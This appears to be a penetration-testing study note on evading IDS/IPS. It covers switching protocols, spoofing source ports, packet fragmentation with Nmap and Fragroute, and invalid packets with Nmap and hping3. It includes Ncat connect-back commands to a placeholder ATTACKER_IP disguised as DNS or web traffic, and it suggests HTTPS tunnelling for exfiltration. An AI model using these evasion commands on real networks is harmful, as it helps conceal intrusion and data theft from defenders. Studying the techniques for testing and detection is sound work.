# Evasion via protocol manipulation

 Evasion via protocol manipulation includes:

* Relying on a different protocol
* Manipulating (Source) TCP/UDP port
* Using session splicing (IP packet fragmentation)
* Sending invalid packets

## Rely on a different protocol

The IDS/IPS system might be configured to block certain protocols and allow others. For example, using UDP instead of 
TCP or relying on HTTP instead of DNS to deliver an attack or exfiltrate data. It depends on the target and the 
applications necessary for the target organisation to design the attack. For example, if web browsing is allowed, it 
usually means that protected hosts can connect to ports 80 and 443 unless a local proxy is used. A client relying on 
Google services for their business, can be attacked using Google web hosting to conceal a malicious site. 

Not a one-size-fits-all, and some trial and error might be necessary (do not create too much noise).

In case of an IPS set to block DNS queries and HTTP requests, enforcing a policy where local machines cannot query 
external DNS servers but instead query the local DNS server; moreover, and enforcing secure HTTP communications while
being relatively permissive when it comes to HTTPS, using HTTPS to tunnel traffic looks like a promising approach to 
evade the IPS.

### Ncat

Ncat by default, uses a TCP connection, and can be set to use UDP using the option `-u`

To listen using UDP (where port number is the listen port):
 
    ncat -ulvnp PORT_NUM 

To connect to an Ncat instance listening on a UDP port: 

    nc -u TARGET_IP PORT_NUM

* Running `ncat -lvnp 25` on the attacker system and connecting to it will give the impression that it is a usual 
TCP connection with an SMTP server, **unless the IDS/IPS provides deep packet inspection (DPI)**.
* Executing `ncat -ulvnp 162` on the attacker machine and connecting to it will give the illusion that it is a regular 
UDP communication with an SNMP server **unless the IDS/IPS supports DPI**.

## Manipulate (Source) TCP/UDP port

The TCP and UDP source and destination ports are inspected even by the most basic security solutions. 
**Without deep packet inspection**, the port numbers are the primary indicator of the service used: 
network traffic involving TCP port 22 would be interpreted as SSH traffic unless the security solution can analyse 
the data carried by the TCP segments.

### Nmap

Add the option `-g PORT_NUMBER` (or `--source-port PORT_NUMBER`) to make Nmap send all its traffic from a specific 
source port number.

For example, use `nmap -sS -Pn -g 80 -F MACHINE_IP` to make the port scanning traffic appear to be exchanged with an 
HTTP server at first glance. When scanning UDP ports, use `nmap -sU -Pn -g 53 -F MACHINE_IP` to make the traffic 
appear to be exchanged with a DNS server.

### Ncat

Trying to camouflage the traffic as if it is DNS traffic:

* On the attacker machine, to use Ncat to listen on UDP port 53 (as a DNS server would), use `ncat -ulvnp 53`.
* On the target, connect back to the listening server using `ncat -u ATTACKER_IP 53`.

To make it appear more like web traffic where clients communicate with an HTTP server:

* On the attacker machine, to get Ncat to listen on TCP port 80, like a benign web server, you can use `ncat -lvnp 80`.
* On the target, connect to the listening server using `nc ATTACKER_IP 80`.

## Use session splicing (IP packet fragmentation)

Another approach possible in IPv4 is IP packet fragmentation (session splicing). The assumption is that if you break 
the packet(s) related to an attack into smaller packets, you will avoid matching the IDS signatures. If the IDS is 
looking for a particular stream of bytes to detect the malicious payload, divide the payload among multiple packets. 
Unless the IDS reassembles the packets, the rule won’t be triggered.

### Nmap

Nmap offers a few options to fragment packets. Add:

* `-f` to set the data in the IP packet to 8 bytes.
* `-ff` to limit the data in the IP packet to 16 bytes at most.
* `--mtu SIZE` to provide a custom size for data carried within the IP packet. The size should be a multiple of 8.

Suppose you want to force all your packets to be fragmented into specific sizes. In that case, consider using a 
program such as [Fragroute](https://www.monkey.org/~dugsong/fragroute/). It can be set to read a set of rules from a 
given configuration file and applies them to incoming packets. For simple IP packet fragmentation, it would be 
enough to use a configuration file with `ip_frag SIZE` to fragment the IP data according to the provided size. 
**The size must be a multiple of 8**.

For example, you can create a configuration file `fragroute.conf` with one line, `ip_frag 16`, to fragment packets 
where IP data fragments do not exceed 16 bytes. Then run the command `fragroute -f fragroute.conf HOST`. 
The `HOST` is the destination to which to send the fragmented packets to.

## Sending invalid packets

The response of systems to valid packets **tends** to be predictable. It can be unclear how systems will respond to 
invalid packets. For example, an IDS/IPS might process an invalid packet, while the target system might ignore it. 
The exact behaviour requires some experimentation or inside knowledge.

Nmap makes it possible to create invalid packets in a many ways. Two common options are to scan the target using 
packets that have:

* Invalid TCP/UDP checksum
* Invalid TCP flags

Nmap allows for sending packets with a wrong TCP/UDP checksum using the option `--badsum`. An incorrect checksum 
indicates that the original packet has been altered somewhere across its path from the sending program.

Nmap also allows for sending packets with custom TCP flags, including invalid ones. The option `--scanflags` allows
for setting flags:

* `URG` for Urgent
* `ACK` for Acknowledge
* `PSH` for Push
* `RST` for Reset
* `SYN` for Synchronize
* `FIN` for Finish

To craft packets with custom fields (valid or invalid), consider a tool such as [hping3](http://www.hping.org/). A 
few example options:

* `-t` or `--ttl` to set the Time to Live in the IP header.
* `-b` or `--badsum` to send packets with a bad UDP/TCP checksum.
* `-S`, `-A`, `-P`, `-U`, `-F`, `-R` to set the TCP `SYN`, `ACK`, `PUSH`, `URG`, `FIN`, and `RST` flags, respectively.

## Resources

* [EV: IDS Evasion via TCP/IP Packet Manipulation](https://github.com/TomAPU/ev)

